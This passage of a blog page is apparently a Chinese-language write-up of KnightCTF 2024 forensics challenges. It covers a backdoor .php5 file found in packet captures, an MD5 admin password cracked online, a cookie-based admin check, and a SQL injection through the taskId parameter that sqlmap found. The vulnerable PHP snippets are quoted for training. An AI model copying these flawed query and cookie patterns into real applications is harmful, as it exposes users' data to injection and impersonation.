AwMDIwNjUgIDJkIDFmIGEzIGZiIGU1IGNmIDkzIGFlICAxMiAyMyBiMyA2YSBkYSA2ZSAzNCBhZiAgIC0uLi4uLi4uIC4jLmoubjQuCiAgICAwMDAwMjA3NSAgOWEgZWQgODMgMzYgNjcgZTAgOGMgMWUgIDIxIDViIGU0IDkwIGEzIDQyIGY3IGM0ICAgLi4uNmcuLi4gIVsuLi5CLi4KICAgIDAwMDAyMDg1ICBhZCA3OCBkNiAzYyBhMyBiMCBiYiBmNSAgY2IgZmUgMTEgODUgMmQgYTAgNzkgMjQgICAueC48Li4uLiAuLi4uLS55JAogICAgMDAwMDIwOTUgIGVjIDZiIGY4IDA3IDUwIDRiIDAxIDAyICAxZiAwMCAwYSAwMCAwMCAwMCAwMCAwMCAgIC5rLi5QSy4uIC4uLi4uLi4uCiAgICAwMDAwMjBBNSAgMGIgMGIgMjkgNTggMDAgMDAgMDAgMDAgIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwICAgLi4pWC4uLi4gLi4uLi4uLi4KICAgIDAwMDAyMEI1ICAwNCAwMCAyNCAwMCAwMCAwMCAwMCAwMCAgMDAgMDAgMTAgMDAgMDAgMDAgMDAgMDAgICAuLiQuLi4uLiAuLi4uLi4uLgogICAgMDAwMDIwQzUgIDAwIDAwIDYxIDcwIDcwIDJmIDBhIDAwICAyMCAwMCAwMCAwMCAwMCAwMCAwMSAwMCAgIC4uYXBwLy4uICAuLi4uLi4uCiAgICAwMDAwMjBENSAgMTggMDAgYmUgZTUgOTEgNDkgNjggNDIgIGRhIDAxIGQwIGM1IDEwIDBmIGQ5IDQ3ICAgLi4uLi5JaEIgLi4uLi4uLkcKICAgIDAwMDAyMEU1ICBkYSAwMSBlMyAyMiBkMyAyNCA2MiA0MiAgZGEgMDEgNTAgNGIgMDEgMDIgMWYgMDAgICAuLi4iLiRiQiAuLlBLLi4uLgogICAgMDAwMDIwRjUgIDBhIDAwIDAwIDAwIDAwIDAwIDBlIDBiICAyOSA1OCAwMCAwMCAwMCAwMCAwMCAwMCAgIC4uLi4uLi4uIClYLi4uLi4uCiAgICAwMDAwMjEwNSAgMDAgMDAgMDAgMDAgMDAgMDAgMGIgMDAgIDI0IDAwIDAwIDAwIDAwIDAwIDAwIDAwICAgLi4uLi4uLi4gJC4uLi4uLi4KICAgIDAwMDAyMTE1ICAxMCAwMCAwMCAwMCAyMiAwMCAwMCAwMCAgNjEgNzAgNzAgMmYgNjEgNzMgNzMgNjUgICAuLi4uIi4uLiBhcHAvYXNzZQogICAgMDAwMDIxMjUgIDc0IDczIDJmIDBhIDAwIDIwIDAwIDAwICAwMCAwMCAwMCAwMSAwMCAxOCAwMCAzOCAgIHRzLy4uIC4uIC4uLi4uLi44CiAgICAwMDAwMjEzNSAgZTEgZGMgNGMgNjggNDIgZGEgMDEgNjMgIGM1IDNmIDBmIGQ5IDQ3IGRhIDAxIGJlICAgLi5MaEIuLmMgLj8uLkcuLi4KICAgIDAwMDAyMTQ1ICBlNSA5MSA0OSA2OCA0MiBkYSAwMSA1MCAgNGIgMDEgMDIgMWYgMDAgMTQgMDAgMDAgICAuLkloQi4uUCBLLi4uLi4uLgogICAgMDAwMDIxNTUgIDAwIDA4IDAwIDhjIDBlIDJjIDU4IDNkICAxYyAwMyA2MiAxMiAwMiAwMCAwMCA1OSAgIC4uLi4uLFg9IC4uYi4uLi5ZCiAgICAwMDAwMjE2NSAgMDYgMDAgMDAgMTQgMDAgMjQgMDAgMDAgIDAwIDAwIDAwIDAwIDAwIDIwIDAwIDAwICAgLi4uLi4kLi4gLi4uLi4gLi4KICAgIDAwMDAyMTc1ICAwMCA0YiAwMCAwMCAwMCA2MSA3MCA3MCAgMmYgNjEgNzMgNzMgNjUgNzQgNzMgMmYgICAuSy4uLmFwcCAvYXNzZXRzLwogICAgMDAwMDIxODUgIDczIDc0IDc5IDZjIDY1IDJlIDYzIDczICA3MyAwYSAwMCAyMCAwMCAwMCAwMCAwMCAgIHN0eWxlLmNzIHMuLiAuLi4uCiAgICAwMDAwMjE5NSAgMDAgMDEgMDAgMTggMDAgZTYgMGMgMjggIGIzIGM3IDQ0IGRhIDAxIGJiIDA3IDFlICAgLi4uLi4uLiggLi5ELi4uLi4KICAgIDAwMDAyMUE1ICBiNiA3NCA0NSBkYSAwMSAzOCBlMSBkYyAgNGMgNjggNDIgZGEgMDEgNTAgNGIgMDEgICAudEUuLjguLiBMaEIuLlBLLgogICAgMDAwMDIxQjUgIDAyIDFmIDAwIDBhIDAwIDAwIDAwIDAwICAwMCBhMyBiNSAyYyA1OCAwMCAwMCAwMCAgIC4uLi4uLi4uIC4uLixYLi4uCiAgICAwMDAwMjFDNSAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDEwIDAwIDI0IDAwIDAwIDAwIDAwICAgLi4uLi4uLi4gLi4uJC4uLi4KICAgIDAwMDAyMUQ1ICAwMCAwMCAwMCAxMCAwMCAwMCAwMCA4ZiAgMDIgMDAgMDAgNjEgNzAgNzAgMmYgNjMgICAuLi4uLi4uLiAuLi5hcHAvYwogICAgMDAwMDIxRTUgIDZmIDZlIDc0IDcyIDZmIDZjIDZjIDY1ICA3MiA3MyAyZiAwYSAwMCAyMCAwMCAwMCAgIG9udHJvbGxlIHJzLy4uIC4uCiAgICAwMDAwMjFGNSAgMDAgMDAgMDAgMDEgMDAgMTggMDAgODAgIDE4IGMyIGIyIDc2IDQ1IGRhIDAxIDY2ICAgLi4uLi4uLi4gLi4udkUuLmYKICAgIDAwMDAyMjA1ICA4OSA0NCAwZiBkOSA0NyBkYSAwMSAwZiAgZmIgNWMgMzIgNjIgNDIgZGEgMDEgNTAgICAuRC4uRy4uLiAuXDJiQi4uUAogICAgMDAwMDIyMTUgIDRiIDAxIDAyIDFmIDAwIDE0IDAwIDAwICAwMCAwOCAwMCBjZCBiNSAyYyA1OCBkMCAgIEsuLi4uLi4uIC4uLi4uLFguCiAgICAwMDAwMjIyNSAgNmUgZDggMTkgNmQgMDAgMDAgMDAgNzggIDAwIDAwIDAwIDFjIDAwIDI0IDAwIDAwICAgbi4ubS4uLnggLi4uLi4kLi4KICAgIDAwMDAyMjM1ICAwMCAwMCAwMCAwMCAwMCAyMCAwMCAwMCAgMDAgYmQgMDIgMDAgMDAgNjEgNzAgNzAgICAuLi4uLiAuLiAuLi4uLmFwcAogICAgMDAwMDIyNDUgIDJmIDYzIDZmIDZlIDc0IDcyIDZmIDZjICA2YyA2NSA3MiA3MyAyZiA2OSA3MyA1ZiAgIC9jb250cm9sIGxlcnMvaXNfCiAgICAwMDAwMjI1NSAgNmMgNmYgNjcgNjkgNmUgMmUgNzAgNjggIDcwIDBhIDAwIDIwIDAwIDAwIDAwIDAwICAgbG9naW4ucGggcC4uIC4uLi4KICAgIDAwMDAyMjY1ICAwMCAwMSAwMCAxOCAwMCBhYSAyYyAzMSAgZTIgNzYgNDUgZGEgMDEgNzcgYjMgNTAgICAuLi4uLi4sMSAudkUuLncuUAogICAgMDAwMDIyNzUgIDMyIGQ5IDQ3IGRhIDAxIDgwIDE4IGMyICBiMiA3NiA0NSBkYSAwMSA1MCA0YiAwMSAgIDIuRy4uLi4uIC52RS4uUEsuCiAgICAwMDAwMjI4NSAgMDIgMWYgMDAgMTQgMDAgMDAgMDAgMDggIDAwIGZjIDBjIDJjIDU4IGNkIGRmIDhiICAgLi4uLi4uLi4gLi4uLFguLi4KICAgIDAwMDAyMjk1ICBlMSBiMiAwMSAwMCAwMCBhMCAwMyAwMCAgMDAgMjQgMDAgMjQgMDAgMDAgMDAgMDAgICAuLi4uLi4uLiAuJC4kLi4uLgogICAgMDAwMDIyQTUgIDAwIDAwIDAwIDIwIDAwIDAwIDAwIDY0ICAwMyAwMCAwMCA2MSA3MCA3MCAyZiA2MyAgIC4uLiAuLi5kIC4uLmFwcC9jCiAgICAwMDAwMjJCNSAgNmYgNmUgNzQgNzIgNmYgNmMgNmMgNjUgIDcyIDczIDJmIDcwIDcyIDZmIDYzIDY1ICAgb250cm9sbGUgcnMvcHJvY2UKICAgIDAwMDAyMkM1ICA3MyA3MyA1ZiA2MSA2NCA2NCA1ZiA3NCAgNjEgNzMgNmIgMmUgNzAgNjggNzAgMGEgICBzc19hZGRfdCBhc2sucGhwLgogICAgMDAwMDIyRDUgIDAwIDIwIDAwIDAwIDAwIDAwIDAwIDAxICAwMCAxOCAwMCA4OCA2NCA5NCBmNCBjNSAgIC4gLi4uLi4uIC4uLi5kLi4uCiAgICAwMDAwMjJFNSAgNDQgZGEgMDEgZDYgMTYgM2EgMzcgZDkgIDQ3IGRhIDAxIGYyIGFmIDBjIGZhIGM0ICAgRC4uLi46Ny4gRy4uLi4uLi4KICAgIDAwMDAyMkY1ICA0NCBkYSAwMSA1MCA0YiAwMSAwMiAxZiAgMDAgMTQgMDAgMDAgMDAgMDggMDAgNmMgICBELi5QSy4uLiAuLi4uLi4ubAogICAgMDAwMDIzMDUgIGFiIDJjIDU4IGNjIGMxIGE3IGMzIDUzICAwNSAwMCAwMCAyMyAwZiAwMCAwMCAyNSAgIC4sWC4uLi5TIC4uLiMuLi4lCiAgICAwMDAwMjMxNSAgMDAgMjQgMDAgMDAgMDAgMDAgMDAgMDAgIDAwIDIwIDAwIDAwIDAwIDU4IDA1IDAwICAgLiQuLi4uLi4gLiAuLi5YLi4KICAgIDAwMDAyMzI1ICAwMCA2MSA3MCA3MCAyZiA2MyA2ZiA2ZSAgNzQgNzIgNmYgNmMgNmMgNjUgNzIgNzMgICAuYXBwL2NvbiB0cm9sbGVycwogICAgMDAwMDIzMzUgIDJmIDcwIDcyIDZmIDYzIDY1IDczIDczICA1ZiA2NSA2NCA2OSA3NCA1ZiA3NCA2MSAgIC9wcm9jZXNzIF9lZGl0X3RhCiAgICAwMDAwMjM0NSAgNzMgNmIgMmUgNzAgNjggNzAgMGEgMDAgIDIwIDAwIDAwIDAwIDAwIDAwIDAxIDAwICAgc2sucGhwLi4gIC4uLi4uLi4KICAgIDAwMDAyMzU1ICAxOCAwMCA1NSAzOSA4NiBkOCA2YiA0NSAgZGEgMDEgOTIgNmYgNTkgMzIgZDkgNDcgICAuLlU5Li5rRSAuLi5vWTIuRwogICAgMDAwMDIzNjUgIGRhIDAxIDA4IDYzIDI4IGQ1IGM3IDQ0ICBkYSAwMSA1MCA0YiAwMSAwMiAxZiAwMCAgIC4uLmMoLi5EIC4uUEsuLi4uCiAgICAwMDAwMjM3NSAgMTQgMDAgMDAgMDAgMDggMDAgMDUgYjYgIDJjIDU4IDQyIGQwIGVlIDM1IDM4IDAyICAgLi4uLi4uLi4gLFhCLi41OC4KICAgIDAwMDAyMzg1ICAwMCAwMCA3YyAwNiAwMCAwMCAyMSAwMCAgMjQgMDAgMDAgMDAgMDAgMDAgMDAgMDAgICAuLnwuLi4hLiAkLi4uLi4uLgogICAgMDAwMDIzOTUgIDIwIDAwIDAwIDAwIGVlIDBhIDAwIDAwICA2MSA3MCA3MCAyZiA2MyA2ZiA2ZSA3NCAgICAuLi4uLi4uIGFwcC9jb250CiAgICAwMDAwMjNBNSAgNzIgNmYgNmMgNmMgNjUgNzIgNzMgMmYgIDcwIDcyIDZmIDYzIDY1IDczIDczIDVmICAgcm9sbGVycy8gcHJvY2Vzc18KICAgIDAwMDAyM0I1ICA2YyA2ZiA2NyA2OSA2ZSAyZSA3MCA2OCAgNzAgMGEgMDAgMjAgMDAgMDAgMDAgMDAgICBsb2dpbi5waCBwLi4gLi4uLgogICAgMDAwMDIzQzUgIDAwIDAxIDAwIDE4IDAwIDM1IGFkIDFlICAyMCA3NyA0NSBkYSAwMSA2MCAzYSA2YyAgIC4uLi4uNS4uICB3RS4uYDpsCiAgICAwMDAwMjNENSAgMzIgZDkgNDcgZGEgMDEgYTAgMTcgOGQgIDRhIDYzIDQyIGRhIDAxIDUwIDRiIDAxICAgMi5HLi4uLi4gSmNCLi5QSy4KICAgIDAwMDAyM0U1ICAwMiAxZiAwMCAxNCAwMCAwMCAwMCAwOCAgMDAgMzkgYjYgMmMgNTggYmEgMTIgNWQgICAuLi4uLi4uLiAuOS4sWC4uXQogICAgMDAwMDIzRjUgIDkzIGIzIDAzIDAwIDAwIDQ5IDBhIDAwICAwMCAwZCAwMCAyNCAwMCAwMCAwMCAwMCAgIC4uLi4uSS4uIC4uLiQuLi4uCiAgICAwMDAwMjQwNSAgMDAgMDAgMDAgMjAgMDAgMDAgMDAgNjUgIDBkIDAwIDAwIDYxIDcwIDcwIDJmIDY5ICAgLi4uIC4uLmUgLi4uYXBwL2kKICAgIDAwMDAyNDE1ICA2ZSA2NCA2NSA3OCAyZSA3MCA2OCA3MCAgMGEgMDAgMjAgMDAgMDAgMDAgMDAgMDAgICBuZGV4LnBocCAuLiAuLi4uLgogICAgMDAwMDI0MjUgIDAxIDAwIDE4IDAwIDgzIGI2IDY2IDVjICA3NyA0NSBkYSAwMSBhYiAzYSA5NSAwZiAgIC4uLi4uLmZcIHdFLi4uOi4uCiAgICAwMDAwMjQzNSAgZDkgNDcgZGEgMDEgNTAgYTEgYzcgMmMgIDYyIDQyIGRhIDAxIDUwIDRiIDAxIDAyICAgLkcuLlAuLiwgYkIuLlBLLi4KICAgIDAwMDAyNDQ1ICAxZiAwMCAwYSAwMCAwMCAwMCAwMCAwMCAgMTYgMDYgMjkgNTggMDAgMDAgMDAgMDAgICAuLi4uLi4uLiAuLilYLi4uLgogICAgMDAwMDI0NTUgIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwICAwYiAwMCAyNCAwMCAwMCAwMCAwMCAwMCAgIC4uLi4uLi4uIC4uJC4uLi4uCiAgICAwMDAwMjQ2NSAgMDAgMDAgMTAgMDAgMDAgMDAgNDMgMTEgIDAwIDAwIDYxIDcwIDcwIDJmIDZkIDZmICAgLi4uLi4uQy4gLi5hcHAvbW8KICAgIDAwMDAyNDc1ICA2NCA2NSA2YyA3MyAyZiAwYSAwMCAyMCAgMDAgMDAgMDAgMDAgMDAgMDEgMDAgMTggICBkZWxzLy4uICAuLi4uLi4uLgogICAgMDAwMDI0ODUgIDAwIDk4IDk1IDA2IDRmIDYzIDQyIGRhICAwMSA4NiBlYiAzZiAwZiBkOSA0NyBkYSAgIC4uLi5PY0IuIC4uLj8uLkcuCiAgICAwMDAwMjQ5NSAgMDEgMTMgZjEgOGUgMzYgNjIgNDIgZGEgIDAxIDUwIDRiIDAxIDAyIDFmIDAwIDE0ICAgLi4uLjZiQi4gLlBLLi4uLi4KICAgIDAwMDAyNEE1ICAwMCAwMCAwMCAwOCAwMCAyYiBiZCAyZiAgNTggNGUgYjggYWUgZjkgZDEgMDAgMDAgICAuLi4uLisuLyBYTi4uLi4uLgogICAgMDAwMDI0QjUgIDAwIDNjIDAxIDAwIDAwIDExIDAwIDI0ICAwMCAwMCAwMCAwMCAwMCAwMCAwMCAyMCAgIC48Li4uLi4kIC4uLi4uLi4gCiAgICAwMDAwMjRDNSAgMDAgMDAgMDAgNmMgMTEgMDAgMDAgNjEgIDcwIDcwIDJmIDZkIDZmIDY0IDY1IDZjICAgLi4ubC4uLmEgcHAvbW9kZWwKICAgIDAwMDAyNEQ1ICA3MyAyZiA2NCA2MiAyZSA3MCA2OCA3MCAgMGEgMDAgMjAgMDAgMDAgMDAgMDAgMDAgICBzL2RiLnBocCAuLiAuLi4uLgogICAgMDAwMDI0RTUgIDAxIDAwIDE4IDAwIDFhIDA2IDU1IDBlICBkYSA0NyBkYSAwMSAxYSAwNiA1NSAwZSAgIC4uLi4uLlUuIC5HLi4uLlUuCiAgICAwMDAwMjRGNSAgZGEgNDcgZGEgMDEgOTggOTUgMDYgNGYgIDYzIDQyIGRhIDAxIDUwIDRiIDAxIDAyICAgLkcuLi4uLk8gY0IuLlBLLi4KICAgIDAwMDAyNTA1ICAxZiAwMCAwYSAwMCAwMCAwMCAwMCAwMCAgNzkgYTkgMmMgNTggMDAgMDAgMDAgMDAgICAuLi4uLi4uLiB5LixYLi4uLgogICAgMDAwMDI1MTUgIDAwIDAwIDAwIDAwIDAwIDAwIDAwIDAwICAwYSAwMCAyNCAwMCAwMCAwMCAwMCAwMCAgIC4uLi4uLi4uIC4uJC4uLi4uCiAgICAwMDAwMjUyNSAgMDAgMDAgMTAgMDAgMDAgMDAgNmMgMTIgIDAwIDAwIDYxIDcwIDcwIDJmIDc2IDY5ICAgLi4uLi4ubC4gLi5hcHAvdmkKICAgIDAwMDAyNTM1ICA2NSA3NyA3MyAyZiAwYSAwMCAyMCAwMCAgMDAgMDAgMDAgMDAgMDEgMDAgMTggMDAgICBld3MvLi4gLiAuLi4uLi4uLgogICAgMDAwMDI1NDUgIDcxIGNjIGQ4IGFhIDY5IDQ1IGRhIDAxICA4NSBlMCA0NSAwZiBkOSA0NyBkYSAwMSAgIHEuLi5pRS4uIC4uRS4uRy4uCiAgICAwMDAwMjU1NSAgMmIgNmUgMGQgMzIgNjUgNDIgZGEgMDEgIDUwIDRiIDAxIDAyIDFmIDAwIDE0IDAwICAgK24uMmVCLi4gUEsuLi4uLi4KICAgIDAwMDAyNTY1ICAwMCAwMCAwOCAwMCBjYiBiNSAyYyA1OCAgYTEgMzEgZjEgYTEgZTIgMDMgMDAgMDAgICAuLi4uLi4sWCAuMS4uLi4uLgogICAgMDAwMDI1NzUgIDBkIDBiIDAwIDAwIDE3IDAwIDI0IDAwICAwMCAwMCAwMCAwMCAwMCAwMCAyMCAwMCAgIC4uLi4uLiQuIC4uLi4uLiAuCiAgICAwMDAwMjU4NSAgMDAgMDAgOTQgMTIgMDAgMDAgNjEgNzAgIDcwIDJmIDc2IDY5IDY1IDc3IDczIDJmICAgLi4uLi4uYXAgcC92aWV3cy8KICAgIDAwMDAyNTk1ICA2MSA2NCA2NCA1ZiA3NCA2MSA3MyA2YiAgNzMgMmUgNzAgNjggNzAgMGEgMDAgMjAgICBhZGRfdGFzayBzLnBocC4uIAogICAgMDAwMDI1QTUgIDAwIDAwIDAwIDAwIDAwIDAxIDAwIDE4ICAwMCAxNCAyZSBiZiBlMCA3NiA0NSBkYSAgIC4uLi4uLi4uIC4uLi4udkUuCiAgICAwMDAwMjVCNSAgMDEgYjEgZmQgODcgMzIgZDkgNDcgZGEgIDAxIDk2IDZiIDA4IDljIDY4IDQyIGRhICAgLi4uLjIuRy4gLi5rLi5oQi4KICAgIDAwMDAyNUM1ICAwMSA1MCA0YiAwMSAwMiAxZiAwMCAxNCAgMDAgMDAgMDAgMDggMDAgZDIgYjUgMmMgICAuUEsuLi4uLiAuLi4uLi4uLAogICAgMDAwMDI1RDUgIDU4IDc2IDBlIDQ0IDVmIDc3IDA0IDAwICAwMCAzYyAwZCAwMCAwMCAxNyAwMCAyNCAgIFh2LkRfdy4uIC48Li4uLi4kCiAgICAwMDAwMjVFNSAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMjAgIDAwIDAwIDAwIGFiIDE2IDAwIDAwIDYxICAgLi4uLi4uLiAgLi4uLi4uLmEKICAgIDAwMDAyNUY1ICA3MCA3MCAyZiA3NiA2OSA2NSA3NyA3MyAgMmYgNjQgNjEgNzMgNjggNjIgNmYgNjEgICBwcC92aWV3cyAvZGFzaGJvYQogICAgMDAwMDI2MDUgIDcyIDY0IDJlIDcwIDY4IDcwIDBhIDAwICAyMCAwMCAwMCAwMCAwMCAwMCAwMSAwMCAgIHJkLnBocC4uICAuLi4uLi4uCiAgICAwMDAwMjYxNSAgMTggMDAgNzUgMTAgOTAgZTggNzYgNDUgIGRhIDAxIGQxIDZjIDk4IDMyIGQ5IDQ3ICAgLi51Li4udkUgLi4ubC4yLkcKICAgIDAwMDAyNjI1ICBkYSAwMSA4YiA4YyA3OCA2YSA2NSA0MiAgZGEgMDEgNTAgNGIgMDEgMDIgMWYgMDAgICAuLi4ueGplQiAuLlBLLi4uLgogICAgMDAwMDI2MzUgIDE0IDAwIDAwIDAwIDA4IDAwIGRhIGI1ICAyYyA1OCAyMCAxNyA2YyBiNCA4ZCAwMCAgIC4uLi4uLi4uICxYIC5sLi4uCiAgICAwMDAwMjY0NSAgMDAgMDAgMDEgMDEgMDAgMDAgMTQgMDAgIDI0IDAwIDAwIDAwIDAwIDAwIDAwIDAwICAgLi4uLi4uLi4gJC4uLi4uLi4KICAgIDAwMDAyNjU1ICAyMCAwMCAwMCAwMCA1NyAxYiAwMCAwMCAgNjEgNzAgNzAgMmYgNzYgNjkgNjUgNzcgICAgLi4uVy4uLiBhcHAvdmlldwogICAgMDAwMDI2NjUgIDczIDJmIDZjIDZmIDY3IDZmIDc1IDc0ICAyZSA3MCA2OCA3MCAwYSAwMCAyMCAwMCAgIHMvbG9nb3V0IC5waHAuLiAuCiAgICAwMDAwMjY3NSAgMDAgMDAgMDAgMDAgMDEgMDAgMTggMDAgIDY2IDI1IGExIGYyIDc2IDQ1IGRhIDAxICAgLi4uLi4uLi4gZiUuLnZFLi4KICAgIDAwMDAyNjg1ICBmNCBjMyA5OSAzMiBkOSA0NyBkYSAwMSAgYTIgYjggNTQgNDEgNjkgNDIgZGEgMDEgICAuLi4yLkcuLiAuLlRBaUIuLgogICAgMDAwMDI2OTUgIDUwIDRiIDAxIDAyIDFmIDAwIDE0IDAwICAwMCAwMCAwOCAwMCBkNyBiNSAyYyA1OCAgIFBLLi4uLi4uIC4uLi4uLixYCiAgICAwMDAwMjZBNSAgMzggZDAgYWQgYTEgMmQgMDMgMDAgMDAgIDA0IDA4IDAwIDAwIDEzIDAwIDI0IDAwICAgOC4uLi0uLi4gLi4uLi4uJC4KICAgIDAwMDAyNkI1ICAwMCAwMCAwMCAwMCAwMCAwMCAyMCAwMCAgMDAgMDAgMTYgMWMgMDAgMDAgNjEgNzAgICAuLi4uLi4gLiAuLi4uLi5hcAogICAgMDAwMDI2QzUgIDcwIDJmIDc2IDY5IDY1IDc3IDczIDJmICA3NCA2MSA3MyA2YiA3MyAyZSA3MCA2OCAgIHAvdmlld3MvIHRhc2tzLnBoCiAgICAwMDAwMjZENSAgNzAgMGEgMDAgMjAgMDAgMDAgMDAgMDAgIDAwIDAxIDAwIDE4IDAwIDMyIDA3IDhmICAgcC4uIC4uLi4gLi4uLi4yLi4KICAgIDAwMDAyNkU1ICBlZSA3NiA0NSBkYSAwMSA4NyAyNyBhNiAgMzIgZDkgNDcgZGEgMDEgMzYgMTggODQgICAudkUuLi4nLiAyLkcuLjYuLgogICAgMDAwMDI2RjUgIDJmIDY4IDQyIGRhIDAxIDUwIDRiIDA1ICAwNiAwMCAwMCAwMCAwMCAxMCAwMCAxMCAgIC9oQi4uUEsuIC4uLi4uLi4uCiAgICAwMDAwMjcwNSAgMDAgNjEgMDYgMDAgMDAgNzQgMWYgMDAgIDAwIDAwIDAwICAgICAgICAgICAgICAgICAgLmEuLi50Li4gLi4uCg</span><br></code></pre></td></tr></table></figure><p>解压出来word文档 ctrl+A 改字体颜色<br><code>KCTF&#123;Y0U_Ar3_N3tW0rk_M1n3r&#125; </code></p><h3 id="BackDoor"><a href="#BackDoor" class="headerlink" title="BackDoor"></a>BackDoor</h3><p>What is the backdoor file name?  Please use the attachment of the first challenge.  Flag Format: KCTF{filename.ext}<br>在<code>tcp.dstport==6200</code><br>中找到了写入后门木马的数据流<br><code>tcp.stream eq 1545</code><br><img src="/mdimg/knight2024/23.png"><br><code>KCTF&#123;.621b4CkD0oR.php5&#125;</code></p><h3 id="BackDoor-Path"><a href="#BackDoor-Path" class="headerlink" title="BackDoor Path"></a>BackDoor Path</h3><p>What is the backdoor file name?<br>Flag Format: KCTF{filename.ext}<br><img src="/mdimg/knight2024/24.png"><br><code>KCTF&#123;/var/www/html/app/assets/.621b4CkD0oR.php5&#125;</code></p><h3 id="Super-Admin"><a href="#Super-Admin" class="headerlink" title="Super Admin"></a>Super Admin</h3><table><thead><tr><th>What is the super admin password in the web application?    <strong>Please download this to solve the challenge. You might need this to solve the other challenges.</strong> |</th></tr></thead><tbody><tr><td>Flag Format: KCTF{password}</td></tr><tr><td><img src="/mdimg/knight2024/25.png"></td></tr><tr><td><code>5f27f7648285dec7954f5ee1ad696841</code></td></tr><tr><td><a href="https://md5hashing.net/hash/md5/5f27f7648285dec7954f5ee1ad696841">https://md5hashing.net/hash/md5/5f27f7648285dec7954f5ee1ad696841</a></td></tr><tr><td><code>KCTF&#123;letmeinroot&#125;</code></td></tr></tbody></table><h3 id="Admin-Flag"><a href="#Admin-Flag" class="headerlink" title="Admin Flag"></a>Admin Flag</h3><p>Can you find the Admin Flag of the web server.?  Please use the attachment of the first challenge.  Flag Format: KCTF{fl4G}<br>用前面的流量包把app.zip  dump下来<br><img src="/mdimg/knight2024/26.png"><br>里面找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;role&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;role&#x27;</span>] == <span class="hljs-string">&#x27;root&#x27;</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;span id=&quot;msg&quot;&gt;91)ZJH[.;F?Ulel?Z\hM?U83sBl79ICc#dQ&lt;/span&gt;&#x27;</span>;<br>  &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p><a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base85%EF%BC%88Base85%E8%BD%AC%E6%8D%A2%EF%BC%89('!-u')&input=OTEpWkpIWy47Rj9VbGVsP1pcaE0/VTgzc0JsNzlJQ2MjZFE">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base85%EF%BC%88Base85%E8%BD%AC%E6%8D%A2%EF%BC%89(‘!-u’)&amp;input=OTEpWkpIWy47Rj9VbGVsP1pcaE0/VTgzc0JsNzlJQ2MjZFE</a><br><code>KCTF&#123;y0U_G0t_tHe_AdMin_Fl4g&#125;</code></p><h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>What was the vulnerability on the edit task page &amp; what parameter was vulnerable?  Please use the attachment of the first challenge.  Flag Format: KCTF{VULN_parameter} only the parameter is case sensitive.<br>根据前面流量包发现的sqlmap流量<br>想到是sql注入<br>在<code>controller/process_edit_task.php</code> 找到sql查询源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;taskId&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$uuid</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;taskId&#x27;</span>];<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM `tasks` WHERE `uuid` = <span class="hljs-subst">$uuid</span>&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>KCTF&#123;sqli_taskId&#125;</code></p><h3 id="Famous-Tool-2"><a href="#Famous-Tool-2" class="headerlink" title="Famous Tool 2"></a>Famous Tool 2</h3><p>What tool did the attacker use to identify the vulnerability of edit task page?  Please use the attachment of the first challenge.  Flag Format: KCTF{toolname/version}<br>毫无疑问是sqlmap了<br>随便找一个sqlmap的流量<br><img src="/mdimg/knight2024/27.png"><br><code>KCTF&#123;sqlmap/1.7.10#stable&#125;</code></p><h3 id="Something-Interesting"><a href="#Something-Interesting" class="headerlink" title="Something Interesting"></a>Something Interesting</h3><p>There’s something interesting. Can you find it?<br>Flag Format: KCTF{fl4G}<br><img src="/mdimg/knight2024/28.png"><br><code>zr%uL*_F02#60x?%6#tD%:&#125;8N</code><br><a href="https://ctf.mzy0.com/CyberChef3/#recipe=ROT47(47)&input=enIldUwqX0YwMiM2MHg/JTYjdEQlOn04Tg">https://ctf.mzy0.com/CyberChef3/#recipe=ROT47(47)&amp;input=enIldUwqX0YwMiM2MHg/JTYjdEQlOn04Tg</a><br><code>KCTF&#123;Y0u_aRe_InTeREsTiNg&#125;</code></p><h3 id="Hidden-Page"><a href="#Hidden-Page" class="headerlink" title="Hidden Page"></a>Hidden Page</h3><p>There was a hidden page which was only accessible to root &amp; was removed from the web app for security purpose. Can you find it?<br>Flag Format: KCTF{filename.ext}<br>在<code>/views/tasks.php</code><br><img src="/mdimg/knight2024/29.png"><br><code>KCTF&#123;terminal-13337.php&#125;</code></p><h3 id="DB-Details"><a href="#DB-Details" class="headerlink" title="DB Details"></a>DB Details</h3><p>What is the database username &amp; databasename?<br>Please use the attachment of the first challenge. And keep in mind that the file you have is the backup file. There might be an update to the database.<br>Flag Format: KCTF{username_dbname}<br>在<code>/models/db.php</code>得到数据库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$server_name</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user_name</span> = <span 